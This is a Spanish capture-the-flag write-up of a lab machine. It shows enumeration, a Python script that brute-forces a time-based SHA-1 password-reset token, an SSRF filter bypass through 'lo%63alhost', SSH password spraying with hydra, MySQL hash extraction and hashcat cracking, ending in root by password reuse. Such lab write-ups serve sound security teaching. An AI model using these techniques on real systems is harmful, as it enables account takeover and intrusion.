Realizamos un escaneo simple de nmap para enumerar los puertos
![[Pasted image 20240802123342.png]]

Ahora realizamos un escaneo completo
![[Pasted image 20240802123641.png]]

Ahora pasamos a enumerar los servicios, el puerto 80 no tenemos acceso
![[Pasted image 20240802123737.png]]

En el puerto 8000 si accedemos nos muestra el error `403` 
![[Pasted image 20240802123803.png]]

En el puerto 8080 si que podemos acceder y encontramos la siguiente web
![[Pasted image 20240802123857.png]]

Vamos a enumerar esta pagina, de primeras no encontramos mucha información, comenzaremos realizando fuzzing web para el descubrimiento de directorios y nos encontramos con la siguiente salida
![[Pasted image 20240802124310.png]]

Si revisamos el escaneo nos encuentra el archivo `robots.txt`
![[Pasted image 20240802130938.png]]

Accedemos desde el nageador
![[Pasted image 20240802131025.png]]

Pasamos a realizar fuzzing web al puerto 8000
```Bash
gobuster dir -u http://10.10.162.253:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x txt,php,js,html,sh,py,sql,zip,bak
```

Podemos ver que nos encuentra un fichero zip
![[Pasted image 20240802131447.png]]

Nos lo descargamos accediendo a la ruta
```
http://10.10.162.253:8000/index.zip
```
![[Pasted image 20240802131423.png]]

Lo descomprimimos y nos encontramos con la segunda flag y con archivo llamado app.py
![[Pasted image 20240802131633.png]]

Al leer el programa encontramos un script largo, voy a ir resumiendolo por partes, en la primera podemos ver que ejecuta un archivo llamado `database.sql` el cual puede ser interesante y luego podemos ver una conexión a la base de datos con el usuario `clocky_user` y una password almacenada en un fichero .env
![[Pasted image 20240802133512.png]]

Continuando con el codigo tenemos un formulario que coge un usuario y contraseña, si es correcto accedemos a `/dashboard`
![[Pasted image 20240802134630.png]]

Panel de `/administrator`
```
http://10.10.162.253:8080/administrator
```
![[Pasted image 20240802134706.png]]

La siguiente parte del código es un simple formulario para restablecer la password del usuario, si este usuario es valido, envia un token especial al usuario, la salida si el usuario es valida o no es la misma asi que no podemos enumerarlos
![[Pasted image 20240802134819.png]]

Panel de `/forgot_password`
```
http://10.10.162.253:8080/forgot_password
```
![[Pasted image 20240802134945.png]]


Este endpoint gestiona el restablecimiento de la contraseña en sí. Podemos ver que se espera que el token que se generó anteriormente se pase como un parámetro de URL llamado TEMPORARY (que podría no ser el nombre que se usa ahora). Entonces, el código comprueba la base de datos y si los tokens coinciden, se muestra una página password_reset.html.
![[Pasted image 20240802135056.png]]

Ahora prepararemos el ataque, revisando el codigo y viendo que no se puede realizar una injección SQL y que no funciona el ataque de fuerza bruta, la unica manera de explotar este servicio es obteniendo el token para restablecer las contraseñas, para ello tenemos la siguiente parte de codigo que hace lo siguiente:
Verifica si un usuario existe, genera un nuevo token de restablecimiento utilizando una combinación de la hora actual y el nombre de usuario, lo convierte en un hash SHA-1, y luego actualiza la base de datos con este nuevo token para el usuario especificado.
![[Pasted image 20240805073440.png]]

Ahora prepararemos el ataque que realizara lo siguiente:
1. Identificar el nombre correcto del parámetro que se utiliza para el token. Sin él, no podremos hacer nada aunque obtengamos el token.
2. Solicitar el restablecimiento de la contraseña de un usuario.
3. Lanza rápidamente nuestro script python para generar posibles hashes de los últimos 10 segundos.
4. Utiliza ffuf para buscar el valor correcto del token.
5. Restablecer la contraseña del usuario y conectarse

Para encontrar el nombre podemos hacer fuzzing, aunque haciendo pruebas de forma manual encontramos el valor, primero probamos con un nombre que encontramos en el script pero sin exito
```
http://10.10.175.107:8080/password_reset?TEMPORRARY=1
```
![[Pasted image 20240805074610.png]]

Ahora probamos con el nombre de token y tenemos exito
```
http://10.10.175.107:8080/password_reset?token=1
```
![[Pasted image 20240805074641.png]]

Tenemos la primera parte, ahora generaremos el script:
Este script toma un nombre de usuario, y luego genera hashes potenciales a partir de los últimos 10 segundos (de ahí el 10 en el primer bucle FOR), y también tiene en cuenta los milisegundos (de ahí el 1000 en el segundo bucle FOR). Hay que tener en cuenta el valor de `datetime.timedelta` ya que depende de nuestra hora y la del servidor tendremos que ajustarlo
```Python
import datetime  
import hashlib  
  
TIME_DIFFERENCE = datetime.timedelta(hours=1, minutes=45)  
  
def generate_possible_hashes(username, debug=False):  
    current_time = datetime.datetime.now() - TIME_DIFFERENCE  
    possible_hashes = []  
    for i in range(10):  
        for j in range(1000):  # Consider milliseconds  
            value = current_time - datetime.timedelta(seconds=i, milliseconds=j)  
            lnk = str(value)[:-4] + " . " + username.upper()  
            lnk_hash = hashlib.sha1(lnk.encode("utf-8")).hexdigest()  
            possible_hashes.append(lnk_hash)  
            if debug:  
                print(f"Debug: Generated hash for {lnk}")  
                print(f"Debug: Hash value: {lnk_hash}")  
    return possible_hashes  
  
def save_hashes_to_file(username, hashes):  
    file_name = username + ".out"  
    with open(file_name, "w") as file:  
        for hash_value in hashes:  
            file.write(hash_value.strip() + "\n")  
  
def main():  
    debug = input("Enable debugging? (y/n): ").lower() == 'y'  
    username = input("Enter the username: ")  
    if debug:  
        print(f"Debug: Debugging mode enabled.")  
    possible_hashes = generate_possible_hashes(username, debug)  
    print("Possible SHA-1 hashes generated in the last 10 seconds:")  
    for hash_value in possible_hashes:  
        print(hash_value)  
    save_hashes_to_file(username, possible_hashes)  
    print("Hashes saved to", username + ".out")  
  
if __name__ == "__main__":  
    main()
```

Para sacar la diferencia de hora tenemos que revisar nuestro reloj
![[Pasted image 20240805083621.png]]

Y el del servidor
![[Pasted image 20240805083637.png]]

Ahora el proceso sera el sigueinte, tendremos que cambiar la password de un usuario, en este caso el de `administrator` una vez solicitado rapidamente ejecutamos el script que nos generara unos hasehes que posteriormente probaremos con `ffuf`, asi que primero generamos el hash
![[Pasted image 20240805081455.png]]

Rapidamente ejecutamos el script
![[Pasted image 20240805081728.png]]

Y ahora con `ffuf` probamos todos los hashes
```
ffuf -u "http://10.10.162.52:8080/password_reset?token=FUZZ" -w administrator.out --fs 22
```
![[Pasted image 20240805083326.png]]

Si ahora accedemos a la url añadiendo el token podemos ver nos permite cambiar la passwor del usuario
```
http://10.10.162.52:8080/password_reset?token=d4c73008c24e13af21e809a18fee58569f3db3d0
```
![[Pasted image 20240805083439.png]]

Cambiamos la password
![[Pasted image 20240805083702.png]]

Y ahora probamos a acceder con las credenciales al panel
![[Pasted image 20240805083802.png]]

Ahora tenemos un boton para descargarnos archivos de una url, primero probamos a descargarnos la web
![[Pasted image 20240805084054.png]]

Y al leerlo podemos ver como nos ha adjuntado todo el codigo
![[Pasted image 20240805084118.png]]

Ahora probaremos a ver si nos envia una peticion a nuestra maquina
![[Pasted image 20240805084248.png]]

Y podemos ver que si nos ha enviado la petición
![[Pasted image 20240805084316.png]]

Intentamos descargarnos la petición de la maquina interna pero sin éxito
![[Pasted image 20240805084545.png]]

Probamos con la `http://127.0.0.1` pero sin éxito, probamos la siguiente url y obtenemos el fichero
```
http://lo%63alhost
```
![[Pasted image 20240805084946.png]]
![[Pasted image 20240805085031.png]]

Al leer el fichero nos devuelve lo siguiente
![[Pasted image 20240805085123.png]]

Recordando el codigo teniamos un fichero importante `database.sql`,  lo descargamos y obtenemos la cuarta flag
```
http://lo%63alhost/database.sql
```
![[Pasted image 20240805085511.png]]

Revisando el fichero encontramos unas credenciales
![[Pasted image 20240805085552.png]]

Podemos probar un ataque de rociado de contraseñas contra varios usuarios a ver si obtenemos unas credenciales y tenemos exito
```
hydra -L users.txt -p 'Th1s_1s_4_v3ry_s3cur3_p4ssw0rd' ssh://10.10.162.52
```
![[Pasted image 20240805090135.png]]

Accedemos por ssh
![[Pasted image 20240805090253.png]]

Ahora escalaremos los privilegios para ser root, comenzamos enumerando los usuarios
![[Pasted image 20240805091540.png]]

Intentamos ver los permisos con sudo pero sin exito
![[Pasted image 20240805091606.png]]

Ahora leemos el fichero el cual revisa la password del usuario `clocky_user` de la base de datos
```
clocky_user
seG3mY4F3tKCJ1Yj
```
![[Pasted image 20240805093206.png]]

Y ahora accedemos con las credenciales
![[Pasted image 20240805093322.png]]

Listamos las bases de datos
![[Pasted image 20240805093812.png]]

Listamos las tablas de `clocky` pero unicamente encontramos las credenciales del usuario al que hemos cambiado la password
![[Pasted image 20240805094022.png]]

Seguimos enumerando la base de datos, ahora seleccionando la de `mysql` y listando las tab
![[Pasted image 20240805095845.png]]
![[Pasted image 20240805095929.png]]

Enumeramos la tabla de user
![[Pasted image 20240805095950.png]]

Al intentar listar la tabla de forma normal no podemos leer la información de forma correcta, asi que la listamos de forma vertical
```
SELECT * FROM mysql.user WHERE User = 'dev' \G
```
![[Pasted image 20240805095326.png]]

Y encontramos este plugging
![[Pasted image 20240805095403.png]]

Buscamos información por internet
![[Pasted image 20240805095622.png]]

Ahora sabiendo como cifra las credenciales tendremos que buscar como hacer para que la salida muestre el hash de los usuarios, en la siguiente web tenemos ejemplos de los hashes
```
https://hashcat.net/wiki/doku.php?id=example_hashes
```

Si buscamos el hash en concreto encontramos el siguiente comando que al ejecutarlo obtenemos los hashes de los usuarios
```
SELECT user, CONCAT('$mysql', SUBSTR(authentication_string,1,3), LPAD(CONV(SUBSTR(authentication_string,4,3),16,10),4,0),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
```
![[Pasted image 20240805100855.png]]

Copiamos el hash
```
$mysql$A$0005*1C160A38777C5121134E5D725A58216D5A1D5C3F*6F6B2F577851456465524C4E6771587057456634734A6F6E5A656361774655697A4438466F6B654935462E
```
![[Pasted image 20240805101016.png]]

Ahora crackeamos el hash con hashcat
```
hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
```
![[Pasted image 20240805101536.png]]

Y nos desencripta el hash
```
armadillo
```
![[Pasted image 20240805101634.png]]

El hash de este usuario no esta en el sistema, pero podremos probar si se ha reutilizado la password, la probamos con root y ya hemos escalado los privilegios
![[Pasted image 20240805101747.png]]

Y obtenemos la ultima flag
![[Pasted image 20240805101952.png]]